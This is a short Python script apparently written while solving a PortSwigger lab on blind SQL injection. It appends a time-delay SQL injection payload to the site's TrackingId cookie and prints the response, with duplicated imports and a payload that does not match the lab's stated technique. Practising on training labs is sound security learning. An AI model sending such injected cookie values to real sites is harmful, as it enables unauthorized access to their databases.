# Lab: Blind SQL injection with conditional responses
# https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses
# Start date: 2.20.2021
# Date lab was completed: 2.20.2021
# Todo: Cook the code so other ppl can understand it cuz right now it's messy you runny egg
import requests

# https://stackoverflow.com/questions/17182656/how-do-i-iterate-through-the-alphabet
# Making the assumption that the password is all lowercase letters... but this is where I am unsure
from string import ascii_lowercase, digits

# https://stackoverflow.com/questions/17182656/how-do-i-iterate-through-the-alphabet
# Making the assumption that the password is all lowercase letters... but this is where I am unsure
from string import ascii_lowercase, digits

print("Starting the script! Yeehaw!")
link = "https://acc01fe21eeda21a80af44a800940018.web-security-academy.net/"
response = requests.get(link)
trackingCookie = response.cookies["TrackingId"]
evilQuery = "'; IF (1=1) WAITFOR DELAY '0:0:10'--"
evilCookie = trackingCookie + evilQuery
print(evilCookie)
cookies = {"TrackingId": evilCookie}

response = requests.get(link, cookies=cookies)
print(response.text)

